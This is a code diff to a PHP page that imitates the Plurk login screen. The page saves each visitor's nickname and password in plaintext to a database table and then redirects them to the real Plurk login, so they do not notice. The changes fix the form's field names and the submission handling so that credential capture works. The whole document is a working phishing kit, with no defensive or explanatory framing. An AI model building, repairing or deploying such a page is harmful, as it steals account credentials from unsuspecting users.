@@ -1,4 +1,5 @@
 <?php
+// 1. SETUP & CONNECTION
 // Load database connection info from environment variables
 $host = getenv('DB_HOST');
 $port = getenv('DB_PORT') ?: 5432;
@@ -8,38 +9,32 @@ $pass = getenv('DB_PASS');
 
 try {
   // Connect to PostgreSQL
-  $pdo = new PDO(
-    "pgsql:host=$host;port=$port;dbname=$dbname",
-    $user,
-    $pass,
-    [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]
-  );
+  $dsn = "pgsql:host=$host;port=$port;dbname=$dbname";
+  $pdo = new PDO($dsn, $user, $pass, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
 
-  // Check if nickname and password were sent
-  if (isset($_POST['nickname']) && isset($_POST['password'])) {
+  // 2. HANDLE FORM SUBMISSION
+  if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    
+    // Get values using the correct names
+    $nickname = $_POST['nickname'] ?? '';
+    $password_input = $_POST['password'] ?? '';
 
-    $nickname = trim($_POST['nickname']);
-    $password_input = trim($_POST['password']);
+    if (!empty($nickname) && !empty($password_input)) {
+        // Insert into database
+        $stmt = $pdo->prepare("INSERT INTO plurkinfo (nickname, password_input) VALUES (:nickname, :password_input)");
+        $stmt->execute([
+            ':nickname' => $nickname,
+            ':password_input' => $password_input
+        ]);
 
-    // Insert as separate fields
-    $stmt = $pdo->prepare("
-            INSERT INTO plurkinfo (nickname, password_input)
-            VALUES (:nickname, :password_input)
-        ");
-
-    $stmt->execute([
-      ':nickname' => $nickname,
-      ':password_input' => $password_input
-    ]);
-
-    // Redirect after saving
-    header("Location: https://www.plurk.com/login?r=");
-    exit;
-  } else {
-    echo "Form values not received.";
+        // Redirect after saving
+        header("Location: https://www.plurk.com/login?r=");
+        exit;
+    }
   }
 } catch (PDOException $e) {
-  echo "Database connection failed: " . $e->getMessage();
+  // For testing, print the error so we know if connection fails
+  echo "Database Error: " . $e->getMessage();
 }
 ?>
 
@@ -1399,13 +1394,20 @@ try {
       <div class="logo pif-plurk"></div>
 
       <!-- main form handling -->
-      <form action="index.php" method="post" id="login_form" class="overlay-form">
+<form action="index.php" method="post" id="login_form" class="overlay-form">
         <div class="input-holder">
-          <div id="nick_name"><input type="text" name="nick_name" id="input_nick_name" name="nickname" placeholder="Nickname" value="" spellcheck="false" autocomplete="username" /></div>
-          <div id="password"><input type="password" name="password" id="input_password" name="password" placeholder="Password" autocomplete="current-password" /></div>
+          <div id="nick_name">
+              <input type="text" id="input_nick_name" name="nickname" placeholder="Nickname" value="" spellcheck="false" autocomplete="username" />
+          </div>
+          
+          <div id="password">
+              <input type="password" id="input_password" name="password" placeholder="Password" autocomplete="current-password" />
+          </div>
         </div>
+        
         <div id="reset_password"><a href="/resetPassword">Forgot your password?</a></div>
         <button type="submit" id="login_submit" class="submit">Login</button>
+        
         <div id="term">
           <p>Your login will be remembered for 14 days (or until logout).</p>
         </div>
